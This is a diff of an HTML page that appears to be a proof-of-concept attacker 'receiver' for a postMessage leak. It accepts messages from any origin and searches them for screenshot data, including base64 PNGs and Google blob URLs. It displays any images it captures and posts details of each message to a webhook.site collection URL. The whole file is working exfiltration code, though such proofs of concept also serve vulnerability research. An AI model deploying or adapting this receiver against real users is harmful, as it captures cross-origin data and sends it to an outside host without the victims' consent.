@@ -1,45 +1,67 @@
-<script>
-  const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace if needed
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>Receiver Ready (Binary-Aware)</h3>
+    <script>
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with yours
 
-  function deepFindScreenshot(obj) {
-    const str = JSON.stringify(obj);
-    const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-    const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9\-]+/i);
-    return base64 ? base64[0] : (blob ? blob[0] : null);
-  }
-
-  window.addEventListener("message", (e) => {
-    try {
-      const origin = e.origin;
-      const data = e.data;
-      const keys = Object.keys(data || {});
-      const screenshot = deepFindScreenshot(data);
-
-      console.log("📩 Message from:", origin);
-      console.log("📦 Keys:", keys);
-      console.log("🖼 Screenshot found:", !!screenshot);
-      if (screenshot) {
-        const img = new Image();
-        img.src = screenshot;
-        img.style = "max-width:100%;border:2px solid red";
-        document.body.appendChild(img);
+      function deepFindScreenshot(obj) {
+        const str = JSON.stringify(obj);
+        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+        const blob = str.match(/blob:https:\/\/www\.google\.com\/[a-z0-9\-]+/i);
+        return base64 ? base64[0] : (blob ? blob[0] : null);
       }
 
-      fetch(webhookURL, {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-          origin,
-          keys,
-          containsScreenshot: !!screenshot,
-          truncated: JSON.stringify(data).slice(0, 1000),
-          timestamp: new Date().toISOString()
-        })
-      });
-    } catch (err) {
-      console.error("Error in message handler:", err);
-    }
-  });
+      async function handleBinary(data) {
+        if (data instanceof Blob) {
+          console.log("📦 Received Blob");
+          const url = URL.createObjectURL(data);
+          const img = new Image();
+          img.src = url;
+          img.style = "max-width:100%;border:2px solid green";
+          document.body.appendChild(img);
+        } else if (data instanceof ArrayBuffer) {
+          console.log("📦 Received ArrayBuffer");
+          const blob = new Blob([data], { type: "image/png" });
+          const url = URL.createObjectURL(blob);
+          const img = new Image();
+          img.src = url;
+          img.style = "max-width:100%;border:2px solid blue";
+          document.body.appendChild(img);
+        } else if (typeof data === "object") {
+          const found = deepFindScreenshot(data);
+          if (found) {
+            const img = new Image();
+            img.src = found;
+            img.style = "max-width:100%;border:2px solid red";
+            document.body.appendChild(img);
+          }
+        }
+      }
 
-  console.log("✅ Receiver listening for multiple messages");
-</script>
+      window.addEventListener("message", async (e) => {
+        console.log("📩 postMessage received:", e.origin);
+
+        const data = e.data;
+        const dataType = Object.prototype.toString.call(data);
+
+        console.log("📦 Data type:", dataType);
+
+        await handleBinary(data);
+
+        fetch(webhookURL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({
+            origin: e.origin,
+            keys: typeof data === "object" ? Object.keys(data || {}) : "binary",
+            containsScreenshot: !!deepFindScreenshot(data),
+            timestamp: new Date().toISOString()
+          })
+        });
+      });
+
+      console.log("✅ Binary-aware receiver initialized");
+    </script>
+  </body>
+</html>
